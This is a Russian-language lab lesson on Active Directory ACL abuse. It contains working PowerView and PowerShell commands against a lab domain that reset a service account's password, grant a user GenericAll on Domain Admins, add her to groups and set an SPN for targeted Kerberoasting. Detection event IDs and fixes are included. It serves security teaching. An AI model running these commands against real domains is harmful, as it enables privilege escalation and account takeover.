# 11.3 — ACL abuse

> **M11 · Этап 2 · 5 ч · 🟡 · артефакт:** `labs/m11-ad-attacks/l03-acl/`

## Цель

Научиться читать ACL Active Directory и превращать «лишнее право» в повышение привилегий: от `GenericAll` на пользователе до `WriteDACL` на домене.

## Результат

- Таблица опасных ACE в вашем домене.
- Две рабочие эскалации через ACL.
- Понимание, как это детектится.

## Теория

### 1. Модель прав

AD-объект имеет дескриптор безопасности: owner, DACL (кто что может), SACL (аудит). Права бывают:

| Право | Что позволяет |
|---|---|
| `GenericAll` | всё: сброс пароля, членство, правка атрибутов |
| `GenericWrite` | менять атрибуты (например, `scriptPath`, `msDS-KeyCredentialLink`) |
| `WriteDACL` | переписать ACL → дать себе `GenericAll` |
| `WriteOwner` | стать владельцем → переписать ACL |
| `ForceChangePassword` | сбросить пароль без знания старого |
| `AddMember` | добавить себя в группу |
| `AllExtendedRights` | extended rights, включая сброс пароля |
| `WriteProperty` на `member` | править членство группы |

### 2. Инструменты

```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Get-DomainObjectAcl -ResolveGUIDs | ? { $_.SecurityIdentifier -eq (Get-DomainUser alice).objectsid }
```

Или BloodHound: рёбра `GenericAll`, `WriteDACL`, `Owns`, `AddMember`.

### 3. Эксплуатация

**Сброс пароля:**

```powershell
Set-DomainUserPassword -Identity svc_backup -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

**Добавление в группу:**

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members alice
```

**WriteDACL:**

```powershell
$acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=lab,DC=local"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
  (Get-DomainUser alice).objectsid, "GenericAll", "Allow")
$acl.AddAccessRule($rule)
Set-Acl "AD:\CN=Domain Admins,CN=Users,DC=lab,DC=local" $acl
```

**Targeted Kerberoasting:** `GenericWrite` на пользователе → добавить SPN → запросить TGS → взломать.

**Shadow Credentials:** `GenericWrite` + ADCS → `msDS-KeyCredentialLink` → вход по сертификату (Whisker).

### 4. Детект

- 4662 — доступ к объекту AD с `Control Access Right`.
- 5136 — изменение атрибута (например, `member`, `servicePrincipalName`).
- 4720/4728/4732 — создание/добавление в группы.
- 4724 — сброс пароля.
- Аномалии: изменение ACL, `Everyone`/`Authenticated Users` с `GenericAll`.

## Лаборатория

> В домене: `alice` имеет `GenericAll` на `svc_backup` и `WriteDACL` на группу `Helpdesk`.

### 1. Инвентаризация

```powershell
. C:\lab\PowerView.ps1
Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite" } |
  Select-Object ObjectDN,ActiveDirectoryRights,SecurityIdentifier |
  Format-Table -AutoSize
```

Ожидаемо: список ACE, включая ваши.

### 2. Проверка через BloodHound

Отметьте `alice` как owned, найдите исходящие рёбра. Ожидаемо: путь `alice → svc_backup → ...`.

### 3. Сброс пароля

```powershell
Set-DomainUserPassword -Identity svc_backup -AccountPassword (ConvertTo-SecureString 'Pwned2026!' -AsPlainText -Force)
```

Ожидаемо: успех без знания старого пароля.

### 4. WriteDACL → AddMember

```powershell
Add-DomainObjectAcl -TargetIdentity "Helpdesk" -PrincipalIdentity alice -Rights All
Add-DomainGroupMember -Identity "Helpdesk" -Members alice
Get-DomainGroupMember -Identity "Helpdesk"
```

Ожидаемо: `alice` в `Helpdesk`, дальше — по её правам.

### 5. Targeted Kerberoasting

```powershell
Set-DomainObject -Identity svc_backup -Set @{serviceprincipalname='nonexistent/whatever'}
Get-DomainUser svc_backup | select serviceprincipalname
```

Затем запросите TGS и взломайте. Уберите SPN после лабы.

### 6. События

```powershell
Get-WinEvent -LogName Security -MaxEvents 500 |
  Where-Object Id -in 4662,5136,4724,4728 |
  Select-Object TimeCreated,Id,Message
```

Ожидаемо: ваши изменения видны.

## Атака и защита

- **Атака:** лишний ACE → сброс пароля/членство/теневое credential.
- **Детект:** 4662, 5136, 4724, 4728/4732; сравнение ACL с baseline.
- **Фикс:** регулярный аудит ACL (в том числе `AdminSDHolder`), удаление наследованных `GenericAll` для широких групп, `Protected Users`, мониторинг изменений DACL, tiered model.

## Самопроверка

- [ ] Чем `WriteDACL` опаснее `GenericWrite`?
- [ ] Как `GenericWrite` превращается в Kerberoasting?
- [ ] Что такое Shadow Credentials и какое право нужно?
- [ ] Какой лог покажет изменение `member`?
- [ ] Почему `AdminSDHolder` важен?

## Дальше

[11.4 — Delegation](l04-delegation.md)
